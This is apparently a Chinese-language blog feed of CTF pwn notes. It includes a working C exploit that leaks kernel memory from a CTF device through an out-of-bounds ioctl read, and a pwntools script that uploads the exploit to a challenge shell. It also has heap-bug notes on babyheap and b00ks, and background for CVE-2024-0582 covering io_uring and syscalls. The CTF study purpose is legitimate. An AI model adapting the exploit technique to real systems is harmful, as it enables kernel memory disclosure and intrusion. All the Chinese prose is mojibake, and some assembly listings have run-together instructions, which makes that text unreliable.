class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Kernel Pwn Infrastructures</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUCCESS_MSG(msg)    <span class="hljs-string">&quot;\033[32m\033[1m[+]&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFO_MSG(msg)       <span class="hljs-string">&quot;\033[34m\033[1m[*]&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR_MSG(msg)      <span class="hljs-string">&quot;\033[31m\033[1m[x]&quot;</span> msg <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> log_error(msg)      puts(ERROR_MSG(msg))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_OFFSET 0x100000</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Searching for byte: b&#x27;CTF&#123;fakeflag&#125;&#x27;</span><br><span class="hljs-comment">[pt_ff110000022fc] 0xff11000002335560 &#x27;CTF&#123;fakeflag&#125;\n&#x27;</span><br><span class="hljs-comment">[pt_ffffffffc0201] 0xffffffffc0201560 &#x27;CTF&#123;fakeflag&#125;\n&#x27;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> index;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span> * buf;<br>&#125;data;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// initialize </span><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/slot_machine&quot;</span>, O_RDWR);<br><br>    <span class="hljs-comment">// ioctl to alloc chunk</span><br>    log_info(<span class="hljs-string">&quot;alloc chunk of size 0x400&quot;</span>);<br>    <span class="hljs-type">size_t</span> chunk_size = <span class="hljs-number">0x400</span>;<br>    ioctl(fd, <span class="hljs-number">0</span>, &amp;chunk_size);<br><br>    <span class="hljs-comment">// ioctl to read chunk[-0x436a0]</span><br>    log_info(<span class="hljs-string">&quot;read chunk[-0x100000]&quot;</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">data</span> <span class="hljs-title">user_data</span>;</span><br>    user_data.buf = <span class="hljs-built_in">malloc</span>(MAX_OFFSET);<br>    user_data.index = <span class="hljs-number">0</span> - (MAX_OFFSET);<br>    user_data.size = MAX_OFFSET;<br>    ioctl(fd, <span class="hljs-number">1337</span>, &amp;user_data);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] read chunk :&quot;</span>);<br>    write(<span class="hljs-number">1</span>, user_data.buf, user_data.size);<br>    log_info(<span class="hljs-string">&quot;free chunk&quot;</span>);<br>    ioctl(fd, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>äº¤äº’è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp2&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    exp = base64.b64encode(f.read())<br>    <br><span class="hljs-comment"># p = process(&quot;ncat --ssl slots-d7c8dd09933f35f4.challs.tfcctf.com 1337&quot;.split())</span><br>p = process(<span class="hljs-string">&quot;./run.sh&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;~ $ &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ncat success&quot;</span>)<br><br>count = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp), <span class="hljs-number">0x200</span>):<br>    chunk = exp[i:i + <span class="hljs-number">0x200</span>]<br>    p.sendline(<span class="hljs-string">b&quot;echo -n \&quot;&quot;</span> + chunk + <span class="hljs-string">b&quot;\&quot; &gt;&gt; b64_exp&quot;</span>)<br>    count += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(count):<br>    p.recvuntil(<span class="hljs-string">b&quot;~ $&quot;</span>)<br><br>p.sendline(<span class="hljs-string">b&quot;base64 -d b64_exp &gt; exp&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;chmod +x exp&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;./exp | grep CTF&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ç„¶åæ¥ç€çœ‹å †çš„å†…å®¹ç½¢ï¼ˆï¼‰</p><h1 id="babyheap-0ctf-2017-1"><a href="#babyheap-0ctf-2017-1" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p>64ä½ï¼Œä¿æŠ¤å…¨å¼€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/babyheap_0ctf_2017&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br></code></pre></td></tr></table></figure><p>åˆ†é…ç»“æ„ä½“ç»“æ„ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br><span class="hljs-type">int</span> flag;<br><span class="hljs-type">int</span> size;<br><span class="hljs-type">long</span> <span class="hljs-type">int</span> addr;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨<code>fill</code>å‡½æ•°ä¸­æœ‰ä¸€ä¸ªå †æº¢å‡ºï¼Œå¯ä»¥å†™ä»»æ„<code>size</code>çš„å†…å®¹åˆ°<code>addr</code>å¤„ï¼Œå› æ­¤</p><p><img src="/images/20250903153014.png"></p><p>æ´åŸºæœ¬æ‰¾åˆ°äº†ï¼Œä½†æ˜¯å‘ç°ä¸ä¼šåˆ©ç”¨ï½<br>è¿˜æ˜¯å¯¹å †çš„åŸºæœ¬æ“ä½œå’ŒåŸç†ä¸æ˜¯å¾ˆæ¸…æ™°ã€‚æœ€è¿‘å°±æ‹¿è¿™ä¸ªé¢˜æ¥ç†Ÿæ‚‰ä¸€ä¸‹å †å®ç°çš„å…·ä½“æ“ä½œå’ŒåŸç†å§</p><h1 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h1><p>å †é¢˜ï¼Œä¿æŠ¤å¼€å¯æƒ…å†µï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] <span class="hljs-string">&#x27;/home/spongebob/Document/pwn/pwn&#x27;</span><br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br></code></pre></td></tr></table></figure><p><img src="/images/20250903150722.png"><br>è¿™é‡Œè‡ªå®šä¹‰çš„<code>my_read</code>å‡½æ•°å›è¯»size+1ä¸ªå­—ç¬¦æ‰<code>break</code>æ‰ï¼Œå› ä¸º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(i==size)<br><span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>æ”¾åœ¨æœ€åé¢ï¼Œæ‰€ä»¥å­˜åœ¨ä¸€ä¸ª<code>off_by_one</code>ã€‚åé¢çš„å†…å®¹æ²¡çœ‹æ‡‚ã€‚è¿™é¢˜å…ˆæ”¾ä¸€æ”¾</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-0582</title>
    <link href="/2025/08/29/CVE-2024-0582/"/>
    <url>/2025/08/29/CVE-2024-0582/</url>
    
    <content type="html"><![CDATA[<blockquote><p>éœ€è¦å…ˆäº†è§£ä¸€äº›å‰ç½®çŸ¥è¯†</p></blockquote><h3 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a><code>volatile</code></h3><p>æŒ‡å®šå˜é‡ä¸èƒ½è¢«ç¼–è¯‘å™¨ä¼˜åŒ–ï¼Œæ¯æ¬¡ä½¿ç”¨éƒ½å¿…é¡»ä»åœ°å€ç›´æ¥å–å€¼ã€‚å¦åˆ™ï¼Œç¼–è¯‘å™¨ä¼˜åŒ–åå¯èƒ½å°†å˜é‡å€¼æ”¾å…¥å¯„å­˜å™¨ä¸­æ¥å–å€¼ã€‚</p><span id="more"></span><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">// int volatile a = 10;</span><br>    <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> b = a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>, a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b = %d\n&quot;</span>, b);<br>    __asm__(<br>        <span class="hljs-string">&quot;mov DWORD PTR 12[rsp], 0x20&quot;</span><br>    );<br>    <span class="hljs-type">int</span> c = a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c = %d\n&quot;</span>, c);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>, a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// å¯¹åº”æ±‡ç¼–ï¼š</span><br>main:<br>.LFB51:<br>.cfi_startproc<br>endbr64<br>pushrbp<br>.cfi_def_cfa_offset <span class="hljs-number">16</span><br>.cfi_offset <span class="hljs-number">6</span>, <span class="hljs-number">-16</span><br>learbp, .LC0[rip]<br>movedx, <span class="hljs-number">10</span><br>xoreax, eax<br>movrsi, rbp<br>movedi, <span class="hljs-number">1</span><br>call__printf_chk@PLT<br>movedx, <span class="hljs-number">10</span><br>learsi, .LC1[rip]<br>xoreax, eax<br>movedi, <span class="hljs-number">1</span><br>call__printf_chk@PLT<br>#APP<br># <span class="hljs-number">11</span> <span class="hljs-string">&quot;main.c&quot;</span> <span class="hljs-number">1</span><br>mov DWORD PTR <span class="hljs-number">12</span>[rsp], <span class="hljs-number">0x20</span><br># <span class="hljs-number">0</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-number">2</span><br>#NO_APP<br>movedx, <span class="hljs-number">10</span><br>learsi, .LC2[rip]<br>movedi, <span class="hljs-number">1</span><br>xoreax, eax<br>call__printf_chk@PLT<br>movrsi, rbp<br>movedx, <span class="hljs-number">10</span><br>xoreax, eax<br>movedi, <span class="hljs-number">1</span><br>call__printf_chk@PLT<br>xoreax, eax<br>poprbp<br>.cfi_def_cfa_offset <span class="hljs-number">8</span><br>ret<br>.cfi_endproc<br><br><br><span class="hljs-comment">//ä¸‹é¢çš„æ˜¯æœ‰ä¿®é¥°çš„</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> <span class="hljs-keyword">volatile</span> a = <span class="hljs-number">10</span>;<br>    <span class="hljs-comment">// int a = 10;</span><br>    <span class="hljs-type">int</span> b = a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>, a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b = %d\n&quot;</span>, b);<br>    __asm__(<br>        <span class="hljs-string">&quot;mov DWORD PTR 12[rsp], 0x20&quot;</span><br>    );<br>    <span class="hljs-type">int</span> c = a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c = %d\n&quot;</span>, c);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d\n&quot;</span>, a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// å¯¹åº”æ±‡ç¼–</span><br>main:<br>.LFB51:<br>.cfi_startproc<br>endbr64<br>pushr12<br>.cfi_def_cfa_offset <span class="hljs-number">16</span><br>.cfi_offset <span class="hljs-number">12</span>, <span class="hljs-number">-16</span><br>movedi, <span class="hljs-number">1</span><br>xoreax, eax<br>pushrbp<br>.cfi_def_cfa_offset <span class="hljs-number">24</span><br>.cfi_offset <span class="hljs-number">6</span>, <span class="hljs-number">-24</span><br>learbp, .LC0[rip]<br>movrsi, rbp<br>subrsp, <span class="hljs-number">24</span><br>.cfi_def_cfa_offset <span class="hljs-number">48</span><br>movDWORD PTR <span class="hljs-number">12</span>[rsp], <span class="hljs-number">10</span><br>movr12d, DWORD PTR <span class="hljs-number">12</span>[rsp]<br>movedx, DWORD PTR <span class="hljs-number">12</span>[rsp]<br>call__printf_chk@PLT<br>movedx, r12d<br>movedi, <span class="hljs-number">1</span><br>xoreax, eax<br>learsi, .LC1[rip]<br>call__printf_chk@PLT<br>#APP<br># <span class="hljs-number">11</span> <span class="hljs-string">&quot;main.c&quot;</span> <span class="hljs-number">1</span><br>mov DWORD PTR <span class="hljs-number">12</span>[rsp], <span class="hljs-number">0x20</span><br># <span class="hljs-number">0</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-number">2</span><br>#NO_APP<br>movedx, DWORD PTR <span class="hljs-number">12</span>[rsp]<br>learsi, .LC2[rip]<br>movedi, <span class="hljs-number">1</span><br>xoreax, eax<br>call__printf_chk@PLT<br>movedx, DWORD PTR <span class="hljs-number">12</span>[rsp]<br>movrsi, rbp<br>xoreax, eax<br>movedi, <span class="hljs-number">1</span><br>call__printf_chk@PLT<br>addrsp, <span class="hljs-number">24</span><br>.cfi_def_cfa_offset <span class="hljs-number">24</span><br>xoreax, eax<br>poprbp<br>.cfi_def_cfa_offset <span class="hljs-number">16</span><br>popr12<br>.cfi_def_cfa_offset <span class="hljs-number">8</span><br>ret<br>.cfi_endproc<br></code></pre></td></tr></table></figure><p>ä¸¤ä¸ªç¨‹åºè¿è¡Œä¹Ÿä¸åŒï¼Œæ²¡æœ‰<code>volatile</code>ä¿®é¥°çš„ï¼Œé€šè¿‡å¯„å­˜å™¨ç›´æ¥èµ‹å€¼ï¼Œå¯¼è‡´å†…åµŒæ±‡ç¼–ä¿®æ”¹åœ°å€å¤„çš„å€¼å¤±å»ä½œç”¨ã€‚<br>![[Pasted image 20250819094331.png]]</p><h3 id="å†…å­˜åº"><a href="#å†…å­˜åº" class="headerlink" title="å†…å­˜åº"></a>å†…å­˜åº</h3><p>æŒ‡CPUå¯¹å†…å­˜çš„è®¿é—®é¡ºåºã€‚</p><h3 id="2025-8-7-note-6eaa19-Linuxç³»ç»Ÿè°ƒç”¨è·¯å¾„"><a href="#2025-8-7-note-6eaa19-Linuxç³»ç»Ÿè°ƒç”¨è·¯å¾„" class="headerlink" title="[[2025.8.7_note#^6eaa19|Linuxç³»ç»Ÿè°ƒç”¨è·¯å¾„]]"></a>[[2025.8.7_note#^6eaa19|Linuxç³»ç»Ÿè°ƒç”¨è·¯å¾„]]</h3><p>å†…æ ¸ä¸­æœ‰ä¸€ä¸ªæå…¶é‡è¦çš„æ¦‚å¿µï¼š<code>ç‰¹æƒçº§åˆ«</code>ï¼Œç”¨æˆ·æ€å·¥ä½œåœ¨<code>Ring3</code>ï¼Œå†…æ ¸æ€å·¥ä½œåœ¨<code>Ring0</code>ï¼Œä¸€èˆ¬ï¼Œæˆ‘ä»¬è®¤ä¸º<code>Ring1, Ring2</code>éƒ½æ˜¯ç©ºçš„ã€‚</p><p>ç”¨æˆ·ç¨‹åºè¦è¿›è¡Œä¸€æ¬¡ç‰¹æƒæ“ä½œï¼Œå°±å¿…é¡»æ‰§è¡Œä¸€æ¬¡ç‰¹æƒåˆ‡æ¢ï¼Œå³ä»<code>Ring3</code>è·³åˆ°<code>Ring0</code>ã€‚æ‰§è¡Œå®Œæƒé™ä¹‹ååˆéœ€è¦è¿”å›<code>Ring3</code>ã€‚å®ç°ç‰¹æƒåˆ‡æ¢çš„æ–¹å¼æœ‰ä¸‰ç§ï¼š</p><ol><li>ä¸­æ–­</li><li>é™·é˜±</li><li>ç³»ç»Ÿè°ƒç”¨</li></ol><h4 id="ä¸­æ–­"><a href="#ä¸­æ–­" class="headerlink" title="ä¸­æ–­"></a>ä¸­æ–­</h4><p>ä¸­æ–­æ˜¯ç¡¬ä»¶æˆ–è½¯ä»¶äº§ç”Ÿçš„äº‹ä»¶ã€‚</p><ul><li>ç¡¬ä»¶ä¸­æ–­æ˜¯ç”±ç¡¬ä»¶è®¾å¤‡è§¦å‘çš„ï¼Œç”¨æ¥é€šçŸ¥å†…æ ¸å‘ç”Ÿäº†ç‰¹å®šçš„äº‹ä»¶ã€‚</li><li>è½¯ä»¶ä¸­æ–­æ˜¯ç”±æ‰§è¡Œä¸­çš„ç¨‹åºè§¦å‘çš„ã€‚åœ¨ x86-64 ç³»ç»Ÿä¸Šï¼Œè½¯ä»¶ä¸­æ–­å¯ä»¥é€šè¿‡Â <code>int</code>Â æŒ‡ä»¤è§¦å‘ã€‚</li></ul><h3 id="io-uring"><a href="#io-uring" class="headerlink" title="io_uring"></a><code>io_uring</code></h3><p>è¯¦ç»†çš„ä»‹ç»åœ¨<code>man(7)</code>çš„<a href="https://man7.org/linux/man-pages/man7/io_uring.7.html"><code>io_uring(7)</code></a>ã€‚</p><p><code>io_uring</code>æ˜¯ä¸€ä¸ªçœŸæ­£æ„ä¹‰ä¸Šå®ç°äº†å¼‚æ­¥I&#x2F;Oçš„Linux APIï¼Œå®ƒå…è®¸ç”¨æˆ·æäº¤ä¸€ä¸ªæˆ–å¤šä¸ª I&#x2F;O è¯·æ±‚ï¼Œè¿™äº›è¯·æ±‚å¼‚æ­¥å¤„ç†ï¼Œä¸ä¼šé˜»å¡è°ƒç”¨è¿›ç¨‹ã€‚io_uring çš„åå­—æ¥æºäºç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ä¹‹é—´å…±äº«çš„ç¯å½¢ç¼“å†²åŒºã€‚è¿™ç§å®‰æ’åœ¨å¯èƒ½çš„æƒ…å†µä¸‹å…è®¸é«˜æ•ˆçš„ I&#x2F;Oï¼ŒåŒæ—¶é¿å…äº†åœ¨å®ƒä»¬ä¹‹é—´å¤åˆ¶ç¼“å†²åŒºçš„å¼€é”€ã€‚è¿™ä¸ªæ¥å£ä½¿ io_uring ä¸å…¶ä»– UNIX I&#x2F;O API ä¸åŒï¼Œåœ¨å…¶ä»– UNIX I&#x2F;O API ä¸­ï¼Œä¸æ˜¯é€šè¿‡ç³»ç»Ÿè°ƒç”¨åœ¨å†…æ ¸å’Œç”¨æˆ·ç©ºé—´ä¹‹é—´è¿›è¡Œé€šä¿¡ï¼Œè€Œæ˜¯ä½¿ç”¨ç¯å½¢ç¼“å†²åŒºä½œä¸ºä¸»è¦çš„é€šä¿¡æ¨¡å¼ã€‚</p><p>ä¸»è¦å·¥ä½œæ¨¡å‹æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li><p>åœ¨ç”¨æˆ·ç©ºé—´å’Œå†…æ ¸ç©ºé—´ä¹‹é—´ï¼Œé€šè¿‡<code>io_uring_setup()</code>å’Œ<code>mmap()</code>å»ºç«‹äº†ç¯å½¢ç¼“å†²åŒºï¼Œåˆ†åˆ«ä¸º<code>SQ(submission queue)</code>å’Œ<code>CQ(completion queue)</code>ã€‚ç”¨æˆ·å¯ä»¥å°†<code>I/O</code>è¯·æ±‚æ”¾åˆ°SQé˜Ÿåˆ—ï¼Œå†…æ ¸å°†å®Œæˆçš„I&#x2F;Oè°ƒç”¨ç»“æœæ”¾åˆ°CQé˜Ÿåˆ—ã€‚</p></li><li><p>å¯¹äºç”¨æˆ·éœ€è¦è¿›è¡Œçš„æ¯ä¸ªI&#x2F;Oè¯·æ±‚ï¼ˆå¦‚è¯»å–æ–‡ä»¶ã€å†™å…¥æ–‡ä»¶ã€æ¥å—å¥—æ¥å­—è¿æ¥ç­‰ï¼‰ï¼Œåˆ›å»ºä¸€ä¸ªæäº¤é˜Ÿåˆ—æ¡ç›®ï¼Œæˆ–SQEï¼Œæè¿°éœ€è¦å®Œæˆçš„I&#x2F;Oæ“ä½œï¼Œå¹¶å°†å…¶æ·»åŠ åˆ°æäº¤é˜Ÿåˆ—ï¼ˆSQï¼‰çš„æœ«å°¾ã€‚æœ¬è´¨ä¸Šï¼Œæ¯ä¸ªI&#x2F;Oæ“ä½œéƒ½ç›¸å½“äºåœ¨æ²¡æœ‰ä½¿ç”¨io_uringæ—¶æ‰€åšçš„ç³»ç»Ÿè°ƒç”¨ã€‚ä¾‹å¦‚ï¼Œå°†æ“ä½œç è®¾ç½®ä¸ºIORING_OP_READçš„SQEå°†è¯·æ±‚æ‰§è¡Œç±»ä¼¼äºread(2)ç³»ç»Ÿè°ƒç”¨çš„è¯»å–æ“ä½œã€‚æœ‰å…³æ‰€æœ‰æ”¯æŒçš„æ“ä½œç åŠå…¶å±æ€§çš„æ–‡æ¡£ï¼Œè¯·å‚é˜…io_uring_enter(2)ä¸­çš„æ“ä½œç æ–‡æ¡£ã€‚æ ¹æ®ç”¨æˆ·æƒ³è¦è¯·æ±‚çš„æ“ä½œæ•°é‡ï¼Œå¯ä»¥å°†å¤šä¸ªSQEæ·»åŠ åˆ°é˜Ÿåˆ—ä¸­ã€‚</p></li><li><p>åœ¨æäº¤äº†ä¸€ä¸ª&#x2F;å¤šä¸ªSQEåˆ°SQä¸­åï¼Œç”¨æˆ·å¯ä»¥è°ƒç”¨<code>io_uring_enter()</code>ä»¥é€šçŸ¥å†…æ ¸å¯ä»¥ä»<code>SQ</code>ä¸­å–å‡ºè°ƒç”¨è¯·æ±‚æ¥å®Œæˆå®ƒä»¬ã€‚</p></li><li><p>å¯¹äºæ‚¨æäº¤çš„æ¯ä¸ªSQEï¼Œä¸€æ—¦è¯·æ±‚å¤„ç†å®Œæˆï¼Œå†…æ ¸å°±ä¼šåœ¨å®Œæˆé˜Ÿåˆ—çš„æœ«å°¾æ”¾ç½®ä¸€ä¸ªå®Œæˆé˜Ÿåˆ—äº‹ä»¶æˆ–CQEã€‚å¯¹äºæ‚¨åœ¨SQä¸Šæäº¤çš„æ¯ä¸ªSQEï¼Œå†…æ ¸åœ¨CQä¸­æ”¾ç½®ä¸€ä¸ªç²¾ç¡®åŒ¹é…çš„CQEã€‚åœ¨æ‚¨æ£€ç´¢åˆ°CQEä¹‹åï¼Œè‡³å°‘æ‚¨å¯èƒ½å¯¹æ£€æŸ¥CQEç»“æ„ä¸­çš„reså­—æ®µæ„Ÿå…´è¶£ï¼Œè¯¥å­—æ®µå¯¹åº”äºå¦‚æœæ‚¨ç›´æ¥ä½¿ç”¨è€Œæ²¡æœ‰ä½¿ç”¨io_uringçš„ç³»ç»Ÿè°ƒç”¨ç­‰æ•ˆçš„è¿”å›å€¼ã€‚é‰´äºio_uringæ˜¯ä¸€ä¸ªå¼‚æ­¥æ¥å£ï¼Œerrnoæ°¸è¿œä¸ä¼šç”¨äºä¼ 